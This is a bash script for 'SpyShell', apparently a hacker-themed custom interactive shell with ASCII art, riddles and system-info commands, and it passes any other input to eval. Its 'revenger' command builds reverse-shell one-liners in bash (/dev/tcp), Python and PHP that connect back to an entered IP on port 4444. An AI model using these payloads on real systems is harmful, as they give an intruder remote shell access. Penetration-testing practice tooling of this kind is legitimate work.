#!/bin/bash -i

dontRemoveThisVar="SpyShell"
#color variables
red='\033[0;31m'
boldRED='\033[1;31m'
yellow='\033[1;33m'
green='\033[0;32m'
blue='\033[0;34m'
purple='\033[0;35m'
lightGRN='\033[1;32m'
lightBLUE='\033[1;34m'
nc='\033[0m'
#ascii art
first="""
              &    &&&&&    &&&&&  &
            &    &&,             &&*  &
         &&     &&                &&   &&
         
        &&     &&&&&   &   &    &&&&&   *&
       &&       &&&&  &&&&&&&   &&&       &&
       &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
     &            &&&&&&&&&&&&&&&            &
              &&&&&&&& &&&&& &&&&&&&&
        &&&&&&&  &&&  &&&&&&& &&&  &&&&&&&&
       &&&      &&&& &&&&&&&&& &&&&      &&&
        &&& &&&&  &&&&&&&&&&&&&&  &&&&  &&&
        &&&  &&&   &&&&&&&&&&&&&   &&&  &&&
          &&  &&&   &&&&&&&&&&&   &&&  &&
           &&  &&    %&&&&&&&%    &&  &&
            &&  &&      &&&      &&  &&
              &  &&&&         &&&&  %
                &                 &
"""
second="""
              &    &&&&&    &&&&&  &
            &    &&,             &&*  &
         &&     &&                &&   &&
        &&     &&&&&   &   &    &&&&&   *&
       &&       &&&&  &&&&&&&   &&&       &&
       &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
     &            &&&&&&&&&&&&&&&            &
              &&&&&&&& &&&&& &&&&&&&&
        &&&&&&&  &&&  &&&&&&& &&&  &&&&&&&&
        &&&      &&&& &&&&&&&&& &&&&      &&&
        &&& &&&&  &&&&&&&&&&&&&&  &&&&  &&&
        &&&  &&&   &&&&&&&&&&&&&   &&&  &&&
          &&  &&&   &&&&&&&&&&&   &&&  &&
           &&  &&    %&&&&&&&%    &&  &&
            &&  &&      &&&      &&  &&
              &  &&&&         &&&&  %
                &                 &
"""
third="""
                 &                &
           &  &&                    &&  &
         &  &&,                      &&*  &
      &&   &&                         &&   &&
     &&    &&&&&       &   &        &&&&&   *&
    &&        /&&&&   &&&&&&&   &&&&         &&
    &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
     &            &&&&&&&&&&&&&&&            &
              &&&&&&&& &&&&& &&&&&&&&
        &&&&&&&  &&&  &&&&&&& &&&  &&&&&&&&
       &&&      &&&& &&&&&&&&& &&&&      &&&
        &&& &&&&  &&&&&&&&&&&&&&  &&&&  &&&
        &&&  &&&   &&&&&&&&&&&&&   &&&  &&&
         &&   &&    &&&&&&&&&&&    &&   &&
          &&  &&&   &&&&&&&&&&&   &&&  &&
           &&  &&    %&&&&&&&%    &&  &&
            &&  &&      &&&      &&  &&
              &  &&&&         &&&&  %
                &                 &
"""

fourth="""
               &                   &
          &  &&                     &&  &
        &  &&,                       &&*  &
      &&   &&                         &&   &&
     &&    &&&&&       &   &        &&&&&   *&
    &&        /&&&&   &&&&&&&   &&&&         &&
    &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
     &            &&&&&&&&&&&&&&&            &
             &&&&&&&&  &&&&&  &&&&&&&&
    &&&&&&&&&   &&&   &&&&&&&   &&&   &&&&&&&&&
     &&&      &&&&   &&&&&&&&&   &&&&      &&&
     &&&   &&&&   &&&&&&&&&&&&&&&   &&&&   &&&
     &&&    &&&    &&&&&&&&&&&&&    &&&    &&&
      &&     &&     &&&&&&&&&&&     &&     &&
      &&     &&&    &&&&&&&&&&&    &&&     &&
       &&     &&     %&&&&&&&%     &&     &&
        &&     &&       &&&       &&     &&
          &     &&               &&     %
                   &           %
"""
fifth="""
              &                     &
       &    &&                       &&    &
      &   &&,                         &&*   &
     &&   &&                           &&   &&
    &&    &&&&&        &   &        &&&&&   *&&
    &&        /&&&&   &&&&&&&   &&&&         &&
    &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
     &            &&&&&&&&&&&&&&&            &
             &&&&&&&&  &&&&&  &&&&&&&&
   &&&&&&&&&&   &&&   &&&&&&&   &&&   &&&&&&&&&&
    &&&      &&&&   &&&&&&&&&&&   &&&&      &&&
    &&&   &&&&   &&&&&&&&&&&&&&&&&   &&&&   &&&
    &&&    &&&    &&&&&&&&&&&&&&&    &&&    &&&
     &&     &&     &&&&&&&&&&&&&     &&     &&
     &&     &&&    &&&&&&&&&&&&&    &&&     &&
      &&     &&     %&&&&&&&&&%     &&     &&
       &&     &&       &&&&&       &&     &&
         &     &&                 &&     %
                  &             % 
"""
sixth="""
    o__ __o                __o            o      o__ __o                
   /v     v\               __|>          <|>    /v     v\               
  />       <\                |           < \   />       <\              
 _\o____        \o_ __o     <o>     o__ __o/            o/    o      o  
      \_\__o__   |    v\     |     /v     |           _<|    <|>    <|> 
            \   / \    <\   < >   />     / \             \   < >    < > 
  \         /   \o/     /    |    \      \o/  \          /    \o    o/  
   o       o     |     o     o     o      |     o       o      v\  /v   
   <\__ __/>    / \ __/>   __|>_   <\__  / \    <\__ __/>       <\/>    
                \o/                                              /      
                 |                                              o       
                / \                                          __/> 
"""



#rc
shopt -s checkwinsize
set -o vi
set -o emacs
HISTCONTROL=ignoreboth
HISTSIZE=1000
HISTFILESIZE=2000
#main program

#confirm_exit function
trap 'confirm_exit' 2
confirm_exit(){
    echo -e -n "${blue}"
    read -r -p "Are you sure you want to exit? (y/n) " confirm
    echo -e -n "${nc}"
    if [ "$confirm" = "y" ]; then
        echo -n -e "${blue}Exiting the script${nc}"
        exit
    else
    	echo -n -e "${blue}Cancled${nc}"
    fi
}

#here mr.robot
mr_robot(){
	clear
	echo "3" | figlet
	sleep 1
	echo "2" | figlet
	sleep 1
	clear
	echo "1" | figlet
	sleep 1
	clear
	echo "Mr.Robot aka 'Elliot Alderson'" | figlet
	sleep 1
	clear
	
	
	
}
#here riddler

riddler(){
	arr=("I am always hungry, \nI must always be fed. \nThe finger I touch, \nwill soon turn red. \nWhat am I ?" "I am something you cannot touch, \nbut I can be found in every byte. \nWhat am I ?" "I am a code, \na set of instructions. \nI can be executed, \nbut I can't be touched. \nWhat am I ?" "I am a part of your computer, \nbut I am not a hardware. \nI can be found on every computer, \nbut can't be seen. \nWhat am I ?" "I am a key, \nbut not physical. \nI can unlock secrets, \nbut I can't be touched. \nWhat am I ?" "I am a code, \nbut not a script. \nI can be cracked, \nbut I can't be seen. \nWhat am I ?" "I am a network, \nbut not physical. \nI can connect you to the world, \nbut I can't be touched. \nWhat am I ?" "I can protect, \nbut I can also be broken. \nI am stronger than a lock, \nbut weaker than a key. \nWhat am I ?" "I am a tool, \nbut not a weapon. \nI can find vulnerabilities, \nbut I can't be used to attack. \nWhat am I ?" "I am a defense, \nbut not a wall. \nI can stop attacks, \nbut I can't be seen. \nWhat am I ?" "I can steal your identity, \nbut I'm not a thief. \nI can access your accounts, \nbut I can't be touched. \nWhat am I ?" "I can make you anonymous, \nbut I'm not a cloak. \nI can hide your IP, \nbut I can't be seen. \nWhat am I ?" "I can stop intruders, \nbut I'm not a guard. \nI can detect and respond to threats, \nbut I can't be touched. \nWhat am I ?" "I can prevent data breaches, \nbut I'm not a lock. \nI can encrypt and decrypt, \nbut I can't be touched. \nWhat am I ?" "I am a defense, \nbut not a shield. \nI can protect against malware, \nbut I can't be seen. \nWhat am I ?" "I am a code, \nbut not a script. \nI can be cracked, \nbut I can't be touched. \nWhat am I ?")
	arr1=("I am the beginning of the end, \nthe end of every place. \nI am the beginning of eternity, \nthe end of time and space. \nWhat am I ?" "I am not alive, \nbut I grow. \I don't have lungs, \but I need air. \nI don't have a mouth, \nbut water kills me. \nWhat am I ?" "I am taken from a mine, \nand shut up in a wooden case, \nfrom which I am never released, \nand yet I am used by almost every person. \nWhat am I?" "I can be cracked, \nmade, \ntold, \nand played. \nWhat am I?" "I am light as a feather, \nbut not even the strongest man can hold me for long. \nWhat am I?" "I am taken from a man, \nbut never borrowed. \nAnd though I am always with you, \nyou are never with me. \nWhat am I?" "I am an odd number. \nTake away a letter, \nand I become even. \nWhat number am I?" "I am a question that always has an answer, but you may never know what it is. I am the mystery that always needs solving, the puzzle that always needs piecing together. What am I? "
 "I am a symbol that is often associated with intelligence and knowledge, \nbut can also be the sign of deceit and manipulation. \nI am the clue that leads to the truth, \nbut also the trap that leads to downfall. \nWhat am I?"
 "I am an enigma that always needs solving, \na mystery that always needs uncovering. \nI am the challenge that always needs overcoming, \nthe puzzle that always needs solving. \nWhat am I?"
 "I am a word that is often associated with cleverness and wit, \nbut can also be the source of confusion and frustration. \nI am the key to unlock the truth, \nbut also the barrier to understanding. \nWhat am I?"
 "I am a symbol that can be a sign of intelligence and knowledge, \nbut also a sign of madness and obsession. \nI am the puzzle that needs solving, \nthe mystery that needs uncovering. \nWhat am I?"
 "I am a challenge that is always waiting for you, \nthe answer is there but you might not be able to see it. \nI am the game you play to prove you're smart, \na test of intelligence that you need to pass. \nWhat am I? ."
 "I am a challenge that is always waiting for you, \nthe answer is there but you might not be able to see it. \nI am the game you play to prove you're smart, \na test of intelligence that you need to pass. \nWhat am I?")
 
	echo -e "${blue}"
	echo -e "wanna play as a techie or the real riddler? \n"
	read -p "TheRiddler(rid)/hacker /,-) " ny
    echo -e "${nc}"
	
	if [[ ${ny} == "hacker" || ${ny} == "hack" ]]
	then
		echo -e "${blue}"
	    echo -e "${arr[$((RANDOM % ${#arr[@]}))]}" | figlet -f "mini.flf"	
	    echo -e "${nc}"
	elif [[ ${ny} == "rid" || ${ny} == "TheRiddler" ]]
	then
	    echo -e "${blue}"
	    echo -e "${arr1[$((RANDOM % ${#arr1[@]}))]}" | figlet -f "mini.flf"	
	    echo -e "${nc}"
    else
        echo -e "${red}"
        echo -e "I am a question with multiple options,\nBut only one leads to the right conclusions,\nSo choose wisely, \ndon't be in a hurry,\nThe right choice will make your future less blurry.\nWhat am I?"
        echo -e "${nc}"
	fi
	
	
	
	
}

#end of riddler


echo -e "${yellow}welcome to ${nc}${red}Sp1d3y's${nc}${yellow} naughty shell try any command like \"hello\"${nc}"

while :
do

        #easy life things
        name=$(whoami)
        extVar=" in "
        prompt=$'\033[1;33m;-)\033[0m\033[1;31m'${name}$'\033[0m\033[1;34m@'$(hostname)$'\033[0m\033[1;32m'${extVar}$'\033[0;34m'$(pwd)$'\033[0m\033[0;35m>>\033[0m\033[1;31m🕸️ \033[0m';
        echo -n -e "${blue}"
        read -i -e -p "${prompt} " cmd
        history -s ${cmd}
        echo -n -e "${nc}"

        #figlet art
        if [[ ${cmd} == "hello" ]]
        then

			echo -e "${yellow}welcome to ${nc}${red}Sp1d3y's${nc}${yellow} naughty shell${nc}"
			echo -n -e "${boldRED}"
			while :; do clear;echo -e "${first}" ; sleep 0.1;clear; echo -e "${second}" ; sleep 0.1;clear; echo -e "${third}" ; sleep 0.1;clear; echo -e "${fourth}" ; sleep 0.1; break; done;
			while :; do clear;echo -e "${first}" ; sleep 0.1;clear; echo -e "${second}" ; sleep 0.1;clear; echo -e "${third}" ; sleep 0.1;clear; echo -e "${fourth}" ; sleep 0.1; break; done;
			while :; do clear;echo -e "${first}" ; sleep 0.1;clear; echo -e "${second}" ; sleep 0.1;clear; echo -e "${third}" ; sleep 0.1;clear; echo -e "${fourth}" ; sleep 0.1; break; done;
			figlet -f small.flf "${cmd} $(whoami)"
			echo -n -e "${nc}"
        elif [[ ${cmd} == "initfun" || ${cmd} == "InitFun" || ${cmd} == "ini" || ${cmd} == "INITFUN" ]]
        then
			echo -n -e "${purple}"
			eval FILE=$(find /home /root /usr/bin -name initfun.sh -exec grep -q "SpyShell" {} \; -print -quit)
			echo -n -e "${nc}"
        elif [[ ${cmd} == "spidey" || ${cmd} == "spy" || ${cmd} == "sp1d3y" ]]
        then
			echo -n -e "${boldRED}"
			echo -e "${sixth}"
			echo -n -e "${nc}"
        elif [[ ${cmd} == "time" ]]
        then
			echo -n -e "${purple}"
			date | awk '{print $4,$5,$6}' | figlet
			echo -n -e "${nc}"
        elif [[ ${cmd} == "date" ]]
        then
			echo -n -e "${purple}"
			date | awk '{print $3,$2,$7}' | figlet
			echo -n -e "${nc}"
        elif [[ ${cmd} == "whoami" ]]
        then
			echo -n -e "${purple}"
        	${cmd} | figlet
			echo -n -e "${nc}"
        elif [[ ${cmd} == "hostname" ]]
        then
			echo -n -e "${purple}"
			${cmd} | figlet
			echo -n -e "${nc}"
        elif [[ ${cmd} == "exit" || ${cmd} == "bye" ]]
        then
			echo -n -e "${boldRED}"
			figlet -f small.flf "good bye $(whoami)"
			exit
			echo -n -e "${nc}"
        elif [[ ${cmd} == "grabip" ]]
        then
            		#print colored output2>/dev/null && ${cmd} 2>spyshell.log
        		echo -n -e "${boldRED}"
        		ifconfig | grep -E "inet [0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | awk '{print $1,$2}' | figlet -f small.flf
        		echo -n -e "${nc}"
	elif [[ ${cmd} == "whereami" ]]
	then
			echo -n -e "${boldRED}"
			eval "pwd | figlet -f 'smbraille.flf'"
			echo -n -e "${nc}"
	elif [[ ${cmd} == "whichDistro" ]]
	then
			echo -n -e "${blue}"
			uname | figlet -f "small.flf"
			cat /etc/os-release | grep --color=never -w "NAME"
			cat /etc/os-release | grep --color=never -w "VERSION"
			lscpu | tr -s " " | grep --color=never -w "Architecture"
			echo -n -e "CPU:"
			lscpu | tr -s " " | grep --color=never -w "Model name:"
			echo -n -e "Kernel:"
			eval "uname -r"
		
			echo -n -e "${nc}"
	elif [[ ${cmd} == "revenger" ]]
        then
                        echo -n -e "${blue}"
                        echo "revenger" | figlet
			echo "Enter target IP address:"
			read ip_address
			echo "Enter shell type (bash/python/php):"
			read shell_type
			if [ "$shell_type" = "bash" ]
			then
    				rev_shell="bash -i >& /dev/tcp/$ip_address/4444 0>&1"
			elif [ "$shell_type" = "python" ]
			then
				rev_shell="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip_address\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
			elif [ "$shell_type" = "php" ]
			then
				rev_shell="php -r '\$sock=fsockopen(\"$ip_address\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
			else
				echo "Invalid shell type. Valid options are bash, python, or php."
				exit 1
			fi
			echo "$rev_shell" | xclip -selection clipboard
			echo "Reverse shell generated and copied to clipboard!"
			echo -n -e "${nc}"
	elif [[ ${cmd} == "SplitV" ]]
    	then
    			echo -n -e "${purple}"
	    		tmux split-window -v -c "./" "./SpyShell.sh"
	    		tmux set -g mouse on
	    		echo -n -e "${nc}"
	elif [[ ${cmd} == "SplitH" ]]
	then
	    		echo -n -e "${purple}"
	    		tmux split-window -h -c "./" "./SpyShell.sh"
	    		echo -n -e "${nc}"
    	elif [[ ${cmd} == "tmux" ]]
    	then
	    		echo -n -e "${purple}"
	    		tmux new-session -n "SpyShell" "$(dirname "$0")/SpyShell.sh"
	    		echo -n -e "${nc}"
	elif [[ ${cmd} == "MRROBOT" || ${cmd} == "mr.robot" || ${cmd} == "mrrobot" || ${cmd} == "MrRobot" || ${cmd} == "Mr.Robot" || ${cmd} == "elliot" || ${cmd} == "ELLIOT" ]]
	then
			echo -n -e "${purple}"
			mr_robot
			echo -n -e "${nc}"
	elif [[ ${cmd} == "riddler" || ${cmd} == "RID" || ${cmd} == "rid" ]]
	then
			echo -n -e "${purple}"
			echo "Riddler" | figlet -f "slant.flf"
			echo "Let your Devil play..."
			echo -n -e "${nc}"
			riddler
	elif [[ ${cmd} == "binAnalyzer" ]]
	then
			echo -n -e "${red}"
			echo "Analyzing binary..." | figlet -f "small.flf"
			echo -n -e "${nc}"
	elif [[ ${cmd} == "crackIt" ]]
	then
			echo -n -e "${purple}"
			echo "crackIt" | figlet -f "small.flf"
			echo -n -e "${nc}"
	elif [[ ${cmd} == "themeDefault" ]]
	then
			echo -n -e "${purple}"
			eval themes/mt/defaultTheme
			echo -n -e "${nc}"
	elif [[ ${cmd} == "spylistner" ]]
	then
			echo "spylistner will be here" | figlet
	elif [[ ${cmd} == "COT" ]]
	then
			echo "chat over terminal" | figlet
	elif [[ ${cmd} == "bash-compline" ]]
	then
			echo "bash completion without tab" | figlet
	elif [[ ${cmd} == "koth setup" ]]
	then
			echo "starting koth setup" | figlet
			#koth automation
	elif [[ ${cmd} == "hello-friend" ]]
	then
			read -e -r -p "enter path of ovpn file : " path
			nohup sudo openvpn ${path} 2>/dev/null &
	elif [[ ${cmd} ]]
	then
			#print colored output2>/dev/null && ${cmd} 2>spyshell.log
			echo -n -e "${purple}"
			eval "${cmd}"
			echo -n -e "${nc}"
	fi	


done
